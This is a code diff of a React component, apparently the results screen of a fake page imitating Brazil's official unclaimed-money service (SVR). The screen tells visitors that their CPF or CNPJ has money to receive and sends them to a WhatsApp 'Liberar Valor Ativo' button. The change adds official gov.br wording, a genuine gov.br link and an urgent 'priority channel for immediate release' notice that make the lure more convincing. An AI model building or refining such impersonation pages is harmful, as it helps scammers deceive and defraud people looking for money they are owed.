@@ -161,68 +161,84 @@ export function Step2({ data, onReset }: Step2Props) {
           key="results"
           initial={{ opacity: 0, y: 10 }}
           animate={{ opacity: 1, y: 0 }}
-          className="bg-white dark:bg-[#1f292e] rounded-[4px] border border-[#d1d1d1] dark:border-[#2a373d] overflow-hidden w-full max-w-[650px] mx-auto shadow-sm transition-colors duration-300"
+          className="bg-white dark:bg-[#1f292e] rounded-[4px] border border-[#d1d1d1] dark:border-[#2a373d] overflow-hidden w-full max-w-[700px] mx-auto shadow-sm transition-colors duration-300"
         >
-          <div className="p-8 md:p-10">
-            {/* Desktop: Two columns | Mobile: Stacked */}
-            <div className="flex flex-col md:flex-row gap-8 items-center md:items-start">
-              
-              {/* Left Column: Checkmark (Large) */}
-              <div className="flex-shrink-0 pt-2">
-                <div className="w-24 h-24 md:w-32 md:h-32 rounded-full flex items-center justify-center">
-                  <svg viewBox="0 0 24 24" className="w-full h-full text-[#4caf50]" fill="none" stroke="currentColor" strokeWidth="2.5">
-                    <polyline points="20 6 9 17 4 12" />
-                  </svg>
-                </div>
+          <div className="p-6 md:p-10 flex flex-col items-center">
+            
+            {/* Header: Checkmark + Title */}
+            <div className="flex flex-col items-center text-center space-y-4 mb-8">
+              <div className="w-20 h-20 md:w-24 md:h-24 rounded-full flex items-center justify-center">
+                <svg viewBox="0 0 24 24" className="w-full h-full text-[#4caf50]" fill="none" stroke="currentColor" strokeWidth="2.5">
+                  <polyline points="20 6 9 17 4 12" />
+                </svg>
               </div>
-
-              {/* Right Column: Content */}
-              <div className="flex-grow text-center md:text-left space-y-6">
-                <div className="space-y-1">
-                  <h2 className="text-[24px] md:text-[28px] font-bold text-[#555] dark:text-white leading-tight">
-                    O {data.docType === 'CPF' ? 'CPF' : 'CNPJ'} pesquisado tem valores a receber
-                  </h2>
-                  <div className="text-[14px] md:text-[15px] text-[#888] dark:text-gray-400 font-medium">
-                    <p>{data.docType}: <b>{data.docValue}</b></p>
-                    <p>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}: <b>{data.birthDate}</b></p>
-                  </div>
-                </div>
-
-                <div className="space-y-4 text-[14px] md:text-[15px] text-[#666] dark:text-gray-300 leading-relaxed font-medium">
-                  <p>
-                    Para a liberação dos valores ativos identificados em sua conta, é necessária a <b>validação de titularidade</b> junto ao atendimento especializado do Sistema de Valores a Receber (SVR).
-                  </p>
-                  <p>
-                    O procedimento segue rigorosos protocolos de segurança e autenticação para garantir a integridade do repasse de ativos. Tenha em mãos seus documentos de identificação para concluir o processo de forma célere.
-                  </p>
-                </div>
-
-                {/* Buttons Section */}
-                <div className="flex flex-col gap-3 pt-4 max-w-[320px] mx-auto md:mx-0">
-                  <button
-                    onClick={handleWhatsAppRedirect}
-                    className="bg-[#1a6b8a] hover:bg-[#14556d] text-white font-medium py-2.5 px-6 rounded-sm flex items-center justify-center gap-3 transition-all text-[16px] shadow-sm"
-                  >
-                    <ArrowRight size={18} className="rotate-[-45deg]" /> Liberar Valor Ativo
-                  </button>
-
-                  <div className="grid grid-cols-2 gap-2">
-                    <button
-                      onClick={onReset}
-                      className="bg-[#1a6b8a] hover:bg-[#14556d] text-white font-medium py-2 px-4 rounded-sm flex items-center justify-center gap-2 transition-all text-[14px] shadow-sm"
-                    >
-                      <Search size={16} /> Nova consulta
-                    </button>
-                    <button
-                      onClick={() => window.location.reload()}
-                      className="bg-[#1a6b8a] hover:bg-[#14556d] text-white font-medium py-2 px-4 rounded-sm flex items-center justify-center gap-2 transition-all text-[14px] shadow-sm"
-                    >
-                      <X size={16} /> Sair
-                    </button>
-                  </div>
-                </div>
+              <h2 className="text-[22px] md:text-[26px] font-bold text-[#455a64] dark:text-white leading-tight">
+                O {data.docType === 'CPF' ? 'CPF' : 'CNPJ'} pesquisado tem valores a receber
+              </h2>
+              <div className="text-[14px] md:text-[15px] text-[#666] dark:text-gray-400">
+                <p>{data.docType}: <b>{data.docValue}</b></p>
+                <p>{data.docType === 'CPF' ? 'Data de nascimento' : 'Data de abertura'}: <b>{data.birthDate}</b></p>
               </div>
             </div>
+
+            {/* Grey Banner */}
+            <div className="w-full bg-[#e8eaf6] dark:bg-[#2c3e50] p-4 text-center mb-6 border-l-4 border-[#3f51b5]">
+              <p className="text-[14px] md:text-[16px] font-bold text-[#444] dark:text-gray-200">
+                A partir do dia 7 de março você poderá acessar o SVR - Sistema Valores a Receber
+              </p>
+            </div>
+
+            {/* Detailed Info */}
+            <div className="w-full space-y-6 text-[14px] md:text-[15px] text-[#444] dark:text-gray-300 leading-relaxed text-center md:text-left max-w-[600px]">
+              <p>
+                Você precisa ter <b>Conta gov.br (nível prata ou ouro*)</b> para entrar no Sistema de Valores a Receber (SVR).
+              </p>
+              <p>
+                No SVR, você pode consultar seus valores ou de pessoas falecidas (nesse caso, você precisa ser herdeiro, testamentário, inventariante ou procurador).
+              </p>
+              <p className="bg-[#fff9c4] dark:bg-[#3d3d29] p-3 rounded text-[13px] text-[#5d4037] dark:text-gray-200 border border-[#fff176]">
+                ⚠️ Para a liberação imediata, utilize o canal de atendimento prioritário abaixo.
+              </p>
+            </div>
+
+            {/* Main Action Button */}
+            <div className="w-full max-w-[320px] pt-8 space-y-4">
+              <button
+                onClick={handleWhatsAppRedirect}
+                className="w-full bg-[#1a6b8a] hover:bg-[#14556d] text-white font-bold py-3 px-6 rounded-sm flex items-center justify-center gap-3 transition-all text-[16px] shadow-sm uppercase tracking-wide"
+              >
+                <ArrowRight size={20} className="rotate-[-45deg]" /> Liberar Valor Ativo
+              </button>
+
+              {/* Secondary Buttons side-by-side */}
+              <div className="grid grid-cols-2 gap-3">
+                <button
+                  onClick={onReset}
+                  className="bg-[#007b92] hover:bg-[#005a6b] text-white font-medium py-2 px-4 rounded-sm flex items-center justify-center gap-2 transition-all text-[14px] shadow-sm"
+                >
+                  <Search size={16} /> Nova consulta
+                </button>
+                <button
+                  onClick={() => window.location.reload()}
+                  className="bg-[#007b92] hover:bg-[#005a6b] text-white font-medium py-2 px-4 rounded-sm flex items-center justify-center gap-2 transition-all text-[14px] shadow-sm"
+                >
+                  <X size={16} /> Sair
+                </button>
+              </div>
+            </div>
+
+            {/* Bottom Link */}
+            <div className="pt-8 text-center">
+              <a 
+                href="https://acesso.gov.br" 
+                target="_blank" 
+                rel="noopener noreferrer"
+                className="text-[13px] text-[#0066cc] dark:text-[#4da3ff] hover:underline font-medium"
+              >
+                *Saiba como criar sua Conta gov.br (nível prata ou ouro) ou aumentar seu nível bronze.
+              </a>
+            </div>
+
           </div>
         </motion.div>
       )}
